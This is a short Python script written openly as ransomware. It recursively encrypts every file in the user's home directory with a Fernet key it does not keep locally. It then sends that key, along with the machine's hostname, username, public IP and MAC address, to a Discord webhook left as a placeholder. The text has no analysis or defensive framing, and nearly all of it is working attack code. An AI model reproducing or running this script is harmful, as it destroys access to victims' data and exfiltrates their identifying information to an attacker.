from cryptography.fernet import Fernet
import os.path
import glob
import requests, re, socket, json, uuid

ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
pub_ip = ip["ip"]
wh_uri = "YOUR_DISCORD_WEBHOOK_HERE"

home_dir=os.path.expanduser('~')
e_path = home_dir+"\\**\*.*"

files = glob.glob(f"{e_path}", recursive=True)

ekey = Fernet.generate_key()

# with open("ekey.key", "wb") as kf:
#     kf.write(ekey)
ofernet = Fernet(ekey)
for f in files:
    try:
        with open(f, "rb") as Tfile:
            Tfile_bytes = Tfile.read()
    except:
        pass
    encrypted_bytes = ofernet.encrypt(Tfile_bytes)

    try:
        with open(f, "wb") as TfileNormal:
            TfileNormal.write(encrypted_bytes)
    except:
        pass
    print("Encrypted", f, "successfully!")

ad={
    "**hostname`**": f"```{socket.gethostname()}```",
    "**Username**": f"```{os.getlogin()}```",
    "**Public IP**": f"```{pub_ip}```",
    "**mac-addr**": f"```{':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
    "**E/D Key**": f"||{ekey}||"
}

data = json.dumps({
    "content": json.dumps(ad),
    "username": "TestHookerBoiii",
    "tts": True
})

r = requests.post(wh_uri, data=data, headers={'Content-Type':'application/json'})


hehe= input("recursively encrypted all files!")
exit()
